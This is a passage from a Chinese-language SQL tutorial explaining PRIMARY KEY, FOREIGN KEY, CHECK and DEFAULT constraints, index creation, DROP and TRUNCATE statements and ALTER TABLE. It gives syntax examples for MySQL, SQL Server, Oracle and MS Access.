<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">PRIMARY KEY (P_Id)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span> PRIMARY KEY,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>如需命名 PRIMARY KEY 约束，并定义多个列的 PRIMARY KEY 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">CONSTRAINT pk_PersonID PRIMARY KEY (P_Id,LastName)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>在上面的实例中，只有一个主键 PRIMARY KEY（pk_PersonID）。然而，pk_PersonID 的值是由两个列（P_Id 和 LastName）组成的。</p>
<p>ALTER TABLE 时的 SQL PRIMARY KEY 约束</p>
<p>当表已被创建时，如需在 “P_Id” 列创建 PRIMARY KEY 约束，请使用下面的 SQL：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> PRIMARY <span class="keyword">KEY</span> (P_Id)</span><br></pre></td></tr></table></figure>

<p>如需命名 PRIMARY KEY 约束，并定义多个列的 PRIMARY KEY 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> pk_PersonID PRIMARY <span class="keyword">KEY</span> (P_Id,LastName)</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>如果您使用 ALTER TABLE 语句添加主键，必须把主键列声明为不包含 NULL 值（在表首次创建时）。</p>
<p>撤销 PRIMARY KEY 约束</p>
<p>如需撤销 PRIMARY KEY 约束，请使用下面的 SQL：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> PRIMARY <span class="keyword">KEY</span></span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> pk_PersonID</span><br></pre></td></tr></table></figure>

<p>撤销PRIMARY KEY约束时，不论约束条件为一列还是多列，对于MySQL，撤销都是</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> PRIMARY <span class="keyword">KEY</span></span><br></pre></td></tr></table></figure>

<p>由于PRIMARY KEY唯一性，MYSQL处理办法简单。</p>
<p>但对于 SQL Server / Oracle / MS Access， 一个列</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> P_Id				//万一 P_Id有别的约束呢？</span><br></pre></td></tr></table></figure>

<p>若起约束名，也可如下多个列</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> pk_PersonID</span><br></pre></td></tr></table></figure>

<h4 id="SQL-FOREIGN-KEY-约束"><a href="#SQL-FOREIGN-KEY-约束" class="headerlink" title="SQL FOREIGN KEY 约束"></a>SQL FOREIGN KEY 约束</h4><p>一个表中的 FOREIGN KEY 指向另一个表中的 PRIMARY KEY(唯一约束的键)。</p>
<p>让我们通过一个实例来解释外键。请看下面两个表：</p>
<p>“Persons” 表：</p>
<table>
<thead>
<tr>
<th align="left">P_Id</th>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
<th align="left">City</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Hansen</td>
<td align="left">Ola</td>
<td align="left">Timoteivn 10</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Svendson</td>
<td align="left">Tove</td>
<td align="left">Borgvn 23</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Pettersen</td>
<td align="left">Kari</td>
<td align="left">Storgt 20</td>
<td align="left">Stavanger</td>
</tr>
</tbody></table>
<p>“Orders” 表：</p>
<table>
<thead>
<tr>
<th align="left">O_Id</th>
<th align="left">OrderNo</th>
<th align="left">P_Id</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">77895</td>
<td align="left">3</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">44678</td>
<td align="left">3</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">22456</td>
<td align="left">2</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">24562</td>
<td align="left">1</td>
</tr>
</tbody></table>
<p>请注意，</p>
<p>“Orders” 表中的 “O_Id” 列指向 “Persons” 表中的 “P_Id” 列。</p>
<p>“Persons” 表中的 “P_Id” 列是 “Persons” 表中的 PRIMARY KEY。</p>
<p>“Orders” 表中的 “O_Id” 列是 “Orders” 表中的 FOREIGN KEY。</p>
<p>FOREIGN KEY 约束用于预防破坏表之间连接的行为。</p>
<p>FOREIGN KEY 约束也能防止非法数据插入外键列，因为它必须是它指向的那个表中的值之一。</p>
<p>CREATE TABLE 时的 SQL FOREIGN KEY 约束</p>
<p>下面的 SQL 在 “Orders” 表创建时在 “P_Id” 列上创建 FOREIGN KEY 约束：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line">(</span><br><span class="line">O_Id <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">OrderNo <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">P_Id <span class="built_in">int</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (O_Id),</span><br><span class="line"><span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> (P_Id) <span class="keyword">REFERENCES</span> Persons(P_Id)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line">(</span><br><span class="line">O_Id <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> PRIMARY <span class="keyword">KEY</span>,</span><br><span class="line">OrderNo <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">P_Id <span class="built_in">int</span> <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> <span class="keyword">REFERENCES</span> Persons(P_Id)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>如需命名 FOREIGN KEY 约束，并定义多个列的 FOREIGN KEY 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line">(</span><br><span class="line">O_Id <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">OrderNo <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">P_Id <span class="built_in">int</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (O_Id),</span><br><span class="line"><span class="keyword">CONSTRAINT</span> fk_PerOrders <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> (P_Id)</span><br><span class="line"><span class="keyword">REFERENCES</span> Persons(P_Id)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>ALTER TABLE 时的 SQL FOREIGN KEY 约束</p>
<p>当 “Orders” 表已被创建时，如需在 “P_Id” 列创建 FOREIGN KEY 约束，请使用下面的 SQL：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> (P_Id)</span><br><span class="line"><span class="keyword">REFERENCES</span> Persons(P_Id)</span><br></pre></td></tr></table></figure>

<p>如需命名 FOREIGN KEY 约束，并定义多个列的 FOREIGN KEY 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> fk_PerOrders</span><br><span class="line"><span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> (P_Id)</span><br><span class="line"><span class="keyword">REFERENCES</span> Persons(P_Id)</span><br></pre></td></tr></table></figure>

<p>撤销 FOREIGN KEY 约束</p>
<p>如需撤销 FOREIGN KEY 约束，请使用下面的 SQL：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> fk_PerOrders</span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> fk_PerOrders</span><br></pre></td></tr></table></figure>

<h4 id="SQL-CHECK-约束"><a href="#SQL-CHECK-约束" class="headerlink" title="SQL CHECK 约束"></a>SQL CHECK 约束</h4><p>CHECK 约束用于限制列中的值的范围。</p>
<p>如果对单个列定义 CHECK 约束，那么该列只允许特定的值。</p>
<p>如果对一个表定义 CHECK 约束，那么此约束会基于行中其他列的值在特定的列中对值进行限制。</p>
<p>CREATE TABLE 时的 SQL CHECK 约束</p>
<p>下面的 SQL 在 “Persons” 表创建时在 “P_Id” 列上创建 CHECK 约束。CHECK 约束规定 “P_Id” 列必须只包含大于 0 的整数。</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">CHECK (P_Id&gt;0)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span> CHECK (P_Id&gt;0),</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>如需命名 CHECK 约束，并定义多个列的 CHECK 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">CONSTRAINT chk_Person CHECK (P_Id&gt;0 <span class="keyword">AND</span> <span class="attribute">City</span>=<span class="string">'Sandnes'</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>ALTER TABLE 时的 SQL CHECK 约束</p>
<p>当表已被创建时，如需在 “P_Id” 列创建 CHECK 约束，请使用下面的 SQL：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CHECK</span> (P_Id&gt;<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>如需命名 CHECK 约束，并定义多个列的 CHECK 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> chk_Person <span class="keyword">CHECK</span> (P_Id&gt;<span class="number">0</span> <span class="keyword">AND</span> City=<span class="string">'Sandnes'</span>)</span><br></pre></td></tr></table></figure>

<p>撤销 CHECK 约束</p>
<p>如需撤销 CHECK 约束，请使用下面的 SQL：</p>
<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> chk_Person</span><br></pre></td></tr></table></figure>

<p><strong>MySQL：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CHECK</span> chk_Person</span><br></pre></td></tr></table></figure>

<h4 id="SQL-DEFAULT-约束"><a href="#SQL-DEFAULT-约束" class="headerlink" title="SQL DEFAULT 约束"></a>SQL DEFAULT 约束</h4><p>DEFAULT 约束用于向列中插入默认值。</p>
<p>如果没有规定其他的值，那么会将默认值添加到所有的新记录。</p>
<p>CREATE TABLE 时的 SQL DEFAULT 约束</p>
<p>下面的 SQL 在 “Persons” 表创建时在 “City” 列上创建 DEFAULT 约束：</p>
<p><strong>My SQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line">(</span><br><span class="line">    P_Id <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    LastName <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    FirstName <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    Address <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    City <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="string">'Sandnes'</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>通过使用类似 GETDATE() 这样的函数，DEFAULT 约束也可以用于插入系统值：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Orders</span><br><span class="line">(</span><br><span class="line">    O_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    OrderNo int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    P_Id int,</span><br><span class="line">    OrderDate date<span class="built_in"> DEFAULT </span>GETDATE()</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>ALTER TABLE 时的 SQL DEFAULT 约束</p>
<p>当表已被创建时，如需在 “City” 列创建 DEFAULT 约束，请使用下面的 SQL：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ALTER</span> City <span class="keyword">SET</span> <span class="keyword">DEFAULT</span> <span class="string">'SANDNES'</span></span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> ab_c <span class="keyword">DEFAULT</span> <span class="string">'SANDNES'</span> <span class="keyword">for</span> City</span><br></pre></td></tr></table></figure>

<p><strong>Oracle：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">MODIFY</span> City <span class="keyword">DEFAULT</span> <span class="string">'SANDNES'</span></span><br></pre></td></tr></table></figure>

<p>撤销 DEFAULT 约束</p>
<p>如需撤销 DEFAULT 约束，请使用下面的 SQL：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ALTER</span> City <span class="keyword">DROP</span> <span class="keyword">DEFAULT</span></span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">COLUMN</span> City <span class="keyword">DROP</span> <span class="keyword">DEFAULT</span></span><br></pre></td></tr></table></figure>

<h4 id="SQL-CREATE-INDEX-语句"><a href="#SQL-CREATE-INDEX-语句" class="headerlink" title="SQL CREATE INDEX 语句"></a>SQL CREATE INDEX 语句</h4><p>CREATE INDEX 语句用于在表中创建索引。</p>
<p>在不读取整个表的情况下，索引使数据库应用程序可以更快地查找数据。</p>
<p>索引</p>
<p>您可以在表中创建索引，以便更加快速高效地查询数据。</p>
<p>用户无法看到索引，它们只能被用来加速搜索/查询。</p>
<p><strong>注释：</strong>更新一个包含索引的表需要比更新一个没有索引的表花费更多的时间，这是由于索引本身也需要更新。因此，理想的做法是仅仅在常常被搜索的列（以及表）上面创建索引。</p>
<p>SQL CREATE INDEX 语法</p>
<p>在表上创建一个简单的索引。允许使用重复的值：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">INDEX</span> index_name</span><br><span class="line"><span class="keyword">ON</span> table_name (column_name)</span><br></pre></td></tr></table></figure>

<p>SQL CREATE UNIQUE INDEX 语法</p>
<p>在表上创建一个唯一的索引。不允许使用重复的值：唯一的索引意味着两个行不能拥有相同的索引值。Creates a unique index on a table. Duplicate values are not allowed:</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> index_name</span><br><span class="line"><span class="keyword">ON</span> table_name (column_name)</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>用于创建索引的语法在不同的数据库中不一样。因此，检查您的数据库中创建索引的语法。</p>
<p>CREATE INDEX 实例</p>
<p>下面的 SQL 语句在 “Persons” 表的 “LastName” 列上创建一个名为 “PIndex” 的索引：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">INDEX</span> PIndex</span><br><span class="line"><span class="keyword">ON</span> Persons (LastName)</span><br></pre></td></tr></table></figure>

<p>如果您希望索引不止一个列，您可以在括号中列出这些列的名称，用逗号隔开：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">INDEX</span> PIndex</span><br><span class="line"><span class="keyword">ON</span> Persons (LastName, FirstName)</span><br></pre></td></tr></table></figure>

<h4 id="SQL-撤销索引、撤销表以及撤销数据库"><a href="#SQL-撤销索引、撤销表以及撤销数据库" class="headerlink" title="SQL 撤销索引、撤销表以及撤销数据库"></a>SQL 撤销索引、撤销表以及撤销数据库</h4><hr>
<p>通过使用 DROP 语句，可以轻松地删除索引、表和数据库。</p>
<hr>
<p>DROP INDEX 语句</p>
<p>DROP INDEX 语句用于删除表中的索引。</p>
<p>用于 MS Access 的 DROP INDEX 语法：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">INDEX</span> index_name <span class="keyword">ON</span> table_name</span><br></pre></td></tr></table></figure>

<p>用于 MS SQL Server 的 DROP INDEX 语法：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">INDEX</span> table_name.index_name</span><br></pre></td></tr></table></figure>

<p>用于 DB2/Oracle 的 DROP INDEX 语法：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">INDEX</span> index_name</span><br></pre></td></tr></table></figure>

<p>用于 MySQL 的 DROP INDEX 语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">INDEX</span> index_name</span><br></pre></td></tr></table></figure>

<p>DROP TABLE 语句</p>
<p>DROP TABLE 语句用于删除表。</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP <span class="keyword">TABLE</span> table_name</span><br></pre></td></tr></table></figure>

<p>DROP DATABASE 语句</p>
<p>DROP DATABASE 语句用于删除数据库。</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> database_name</span><br></pre></td></tr></table></figure>

<p>TRUNCATE TABLE 语句</p>
<p>如果我们仅仅需要删除表内的数据，但并不删除表本身，那么我们该如何做呢？</p>
<p>请使用 TRUNCATE TABLE 语句：</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TRUNCATE <span class="keyword">TABLE</span> table_name</span><br></pre></td></tr></table></figure>

<h4 id="SQL-ALTER-TABLE-语句"><a href="#SQL-ALTER-TABLE-语句" class="headerlink" title="SQL ALTER TABLE 语句"></a>SQL ALTER TABLE 语句</h4><hr>
<p>ALTER TABLE 语句</p>
<p>ALTER TABLE 语句用于在已有的表中添加、删除或修改列。</p>
<p>SQL ALTER TABLE 语法</p>
<p>如需在表中添加列，请使用下面的语法:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">ADD</span> column_name datatype</span><br></pre></td></tr></table></figure>

<p>如需删除表中的列，请使用下面的语法（请注意，某些数据库系统不允许这种在数据库表中删除列的方式）：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">COLUMN</span> column_name</span><br></pre></td></tr></table></figure>

